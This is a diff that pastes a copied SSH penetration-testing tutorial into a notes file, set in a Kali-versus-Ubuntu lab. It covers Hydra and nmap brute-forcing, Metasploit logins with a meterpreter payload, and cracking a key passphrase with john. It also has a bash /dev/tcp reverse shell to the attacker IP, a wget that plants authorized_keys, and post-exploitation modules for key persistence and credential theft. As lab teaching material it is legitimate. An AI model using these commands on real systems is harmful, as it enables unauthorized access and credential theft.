@@ -1,3 +1,237 @@
 ssh user@ip_address
 
 https://www.lifeandcanvas.com/ssh-request-guide/
+-------------------------------------------------------------
+
+https://www.hackingarticles.in/ssh-penetration-testing-port-22/
+
+Introduction
+Secure Shell (SSH) is a cryptographic protocol that provides secure communication over an unsecured network. It is a secure alternative to the non-protected login protocols (such as telnet, rlogin) and insecure file transfer methods (such as FTP). It’s commonly used for remote server management, secure data transfer, and other tasks requiring secure communication. This article will demonstrate different methods to connect and exploit a SSH service running on the target machine. By default the SSH service runs on the port 22 of the machine.
+
+Table of Contents
+Lab Setup
+Installation
+Enumeration
+Password cracking using Hydra
+Authentication using Metasploit
+Running commands on remote machine
+SSH Port redirection
+Nmap SSH brute-force script
+Enumerating SSH authentication methods
+Key based authentication
+Key based authentication(Metasploit)
+Post exploitation using Metasploit
+Local port forwarding (Password based authentication)
+Local port forwarding (Key based authentication)
+Conclusion
+Lab Setup
+In this article we are first going to setup and configure the SSH server on the ubuntu machine and will exploit it using the SSH client on the kali linux machine. Following are the machines:
+
+Target Machine: Ubuntu (192.168.31.205)
+
+Attacker Machine: Kali Linux (192.168.31.141)
+
+Installation
+Install the SSH server on the ubuntu machine using the following command:
+
+apt install openssh-server
+
+It can be noted that the SSH authenticates against the standard Unix user database (/etc/passwd, /etc/shadow, /etc/group), so the password to login into SSH for the user will be same which is used to login into the ubuntu machine.
+
+Enumeration
+The initial enumeration can be performed using nmap inside kali linux by running the following command:
+
+nmap -sV 192.168.31.205
+
+Password cracking using Hydra
+Since the authentication is password based hence the service can be brute forced against a username and password dictionary using hydra to find the correct username and password. After creating a username dictionary as users.txt and password dictionary as pass.txt, the following command can be used:
+
+hydra -L users.txt -P pass.txt 192.168.31.205 ssh
+
+After obtaining the username as pentest and the password as 123, the attacker can now authenticate into the SSH service by using the command:
+
+ssh pentest@192.168.31.205
+
+Authentication using Metasploit
+An alternate way to perform the above procedure could be done by using the Metasploit module. The exploit multi/ssh/sshexec can be used to authenticate into the SSH service. Here we are assuming that the attacker has compromised the username and password already. Following will be the commands inside the Metasploit:
+
+use exploit/multi/ssh/sshexec
+set rhosts 192.168.31.205
+set payload linux/x86/meterpreter/reverse_tcp
+set username pentest
+set password 123
+show targets
+set target 1
+exploit
+
+Running commands on remote machine
+SSH service can also be used to run the system commands on remote machine. The following command can be used:
+
+ssh pentest@192.168.31.205 'ifconfig'
+
+SSH Port redirection
+By default, SSH uses port 22 which comes under the well known ports list. However, we can enable the SSH service to run on any alternate port number by performing the port redirection. The port redirection can be performed by changing the port number in the sshd_config file.
+
+As a root user we will first open the sshd_config file present inside the /etc/ssh directory.
+
+cd /etc/ssh
+ls -al
+nano sshd_config
+
+The default port can be seen here as 22 in the commented line.
+
+The port can be changed to 2222 by removing the commented line as Port 2222.
+After saving the changes in the file, the enumeration performed using kali linux now shows the SSH service running on the new port number which is 2222.
+
+nmap -sV 192.168.31.205
+Also, while performing the brute force using hydra, the updated port needs to be given. Hence, the new command will be:
+
+hydra -L users.txt -P pass.txt 192.168.31.205 ssh -s 2222
+
+Nmap SSH brute-force script
+There are a lot of default scripts in the nmap repository which can be used if the port 22 is open. Here we will talk about the most common script used to brute force the username and password. The script used to perform is the ssh-brute script which uses a default username file from the nselib/data/usernames.lst and default password file from nselib/data/passwords.lst.
+
+nmap --script ssh-brute -p 22 192.168.31.205
+
+We can also give the custom username and password file by giving the flag –script-args userdb=usernames.txt,passdb=passwords.txt.
+
+Enumerating SSH authentication method
+The SSH authentication method can be enumerated by using the ssh-auth-methods script in nmap, the username can be given using the –script-args flag. The following command can be used to enumerate the authentication method used:
+
+nmap --script ssh-auth-methods --script-args="ssh.user=pentest" -p 22 192.168.31.205
+
+The above command enumerated that the authentication type used by the SSH service is both publickey and password based.
+
+Key based authentication
+SSH key-based authentication offers a secure and user-friendly method for accessing remote servers without relying on passwords. This technique employs a pair of cryptographic keys: a private key stored on your local device and a public key saved on the remote server.
+
+The public and private key pair can be generated using the ssh-keygen tool inside the ubuntu machine. A passphrase is also setup for the id_rsa key such that when the user will login using the key based authentication, a passphrase will also be required. By default, the path to store the id_rsa and id_rsa.pub is the .ssh folder of the user’s home directory i.e., /home/pentest/.ssh/id_rsa.
+
+ssh-keygen
+
+Next step is copying the public key (id_rsa.pub) to the authorized_keys file in the same directory.
+
+The authorized_keys file on the remote server contains a list of public keys that are authorized to access the server. By copying the public key (id_rsa.pub) to this file, we are telling the server to trust any connection that presents the corresponding private key.
+
+cd .ssh
+ls -la
+cat id_rsa.pub > authorized_keys
+ls
+
+Now we can disable the password-based authentication in the /etc/ssh/ssd_config file. There is commented line #PasswordAuthentication which is set to yes.
+
+We can change it to no and remove the comment from the line to allow the key based authentication and disable the password-based authentication.
+Again enumerating the service using the ssh-auth-methods script, it shows that the support authentication method is only publickey now. Therefore a key is required to login into the system using this service.
+
+Let’s assume a scenario where we can somehow get the private key of the ubuntu user, then we can directly login using the key based authentication. However, we have to give the private key read and write privilege to the owner but we should take precaution that we are not giving the key over permissions. To give appropriate permissions we will use the following command:
+
+chmod 600 id_rsa
+Now we can use the private key to authenticate into the service.
+
+ssh -i id_rsa pentest@192.168.31.205
+
+As we had already setup a passphrase earlier while generating the private and public key using ssh-keygen, we need to crack the passphrase. There is an inbuilt tool in kali linux called as ssh2john which generates the password hash of the private key. The obtained password hash can be cracked using john the ripper tool.
+
+ssh2john id_rsa > sshhash
+john --wordlist=/usr/share/wordlists/rockyou.txt sshhash
+
+The cracked passphrase is 123, now we can login using the private key into the remote system.
+
+ssh -i id_rsa pentest@192.168.31.205
+
+Key based authentication (Metasploit)
+The above procedure can also be performed using the Metasploit framework. The auxiliary/scanner/ssh/ssh_login_pubkey can be used to authenticate via key.
+
+Following options can be given as configurations to run the auxiliary/scanner:
+
+use auxiliary/scanner/ssh/ssh_login_pubkey
+set rhosts 192.168.31.205
+set key_path /root/Downloads/ssh/id_rsa
+set key_pass 123
+set username pentest
+exploit
+
+After running the auxiliary, the user is enumerated and also a shell session is opened. The shell session can be upgraded to the meterpreter session to get more options. Following are the commands to upgrade an existing shell session to a meterpreter session.
+
+sessions
+sessions -u 1
+sessions
+
+Post exploitation using Metasploit
+After getting the meterpreter session, to create persistence the post exploit can be used to save the private key of the user in the attacker ‘s machine.
+
+The post exploit used here is the linux/manage/sshkey_persistence and the private key is stored at the /root/.msf4/loot/ directory in the kali machine.
+
+sessions
+use post/linux/manage/sshkey_persistence
+set session 1
+exploit
+
+Once the private key is obtained, we can again login into the SSH service using the key based authentication as discussed in the previous section.
+
+cd /root/.msf4/loot
+mv 20240603061535_default_192.168.31.205_id_rsa_575464.txt key
+chmod 600 key
+ssh -i key pentest@192.168.31.205
+
+There is another post exploit module which we can use to gather all the files inside the .ssh directory of the user whose initial shell access has been taken.
+
+use post/multi/gather/ssh_creds
+set session 1
+exploit
+
+After the files have been obtained in the /.msf4/loot/ folder now the process can be repeated to authenticate into the remote system using key based authentication.
+
+ls -al
+mv 20240603061910_default_192.168.31.205_ssh.id_rsa_527520.txt key
+chmod 600 key
+ssh -i key pentest@192.168.31.205
+
+Local Port Forwarding (Password Based Authentication)
+Let’s assume a scenario where we have an initial access and there is a web application running on the target machine internally at port 8080, directly we cannot access the web application in our browser. But through the Local port forwarding supported by SSH we can access the web application on our kali machine. Local port forwarding forwards a port on the local machine to a port on a remote server through an SSH connection.
+
+It can be seen below that the application running internally on the ubuntu machine is directly not accessible from our kali machine.
+
+From the initial shell access, it can be seen that the web application is running internally at port 8080.
+
+netstat -ntlp
+
+SSH supports the local port forwarding functionality and hence the web application can be accessed in the kali machine using the local port forwarding command:
+
+ssh -L 8080:127.0.0.1:8080 pentest@192.168.31.205
+
+Local Port Forwarding (Key Based Authentication)
+Here we are going to show a scenario where the initial access is taken through reverse shell and there is a key based authentication enabled on the remote server. We will add the public key of the kali user to the authorized_keys file inside the ubuntu machine and perform local port forwarding using the SSH key based authentication.
+
+Using the reverse shell generator, we will use the command to get the reverse shell from the ubuntu machine.
+
+The command copied from above is used in the ubuntu machine.
+
+bash -I >& /dev/tcp/192.168.31.141/443 0>&1
+
+A reverse shell is obtained at port 443. Upon enumerating the running services, it can be seen that a web application is running internally on port 8080.
+
+rlwrap nc -lvnp 443
+netstat -tlnp
+
+Here we are generating the ssh key locally in the kali machine, since we already have an initial access so it will be better if we copy the public key of the root user of kali to the authorized_keys file in the ubuntu system.
+
+ssh-keygen
+cd .ssh
+ls -al
+cat id_ed25519.pub > authorized_keys
+updog -p 80
+
+Inside the initial shell which was obtained earlier, we will replace the authorized_keys file inside the .ssh directory of the pentest user.
+
+cd .ssh
+wget http://192.168.31.141/authorized_keys
+ls -al
+
+Once the authorized_keys file is copied now we can use the private key of root user inside kali machine to perform local port forward and access the web application running at port 8080. Here we are forwarding the application port to 7777 in the kali machine.
+
+ssh -i id_ed25519 -L 7777:127.0.0.1:8080 pentest@192.168.31.205
+
+Conclusion
+SSH is a vital utility for system administrators and security experts. Mastering different connection techniques and following best practices ensures the secure and efficient administration of remote systems.
+By employing Kali Linux to access an Ubuntu machine, we’ve demonstrated the flexibility and strength of the SSH protocol, emphasizing its significant role in contemporary network security.
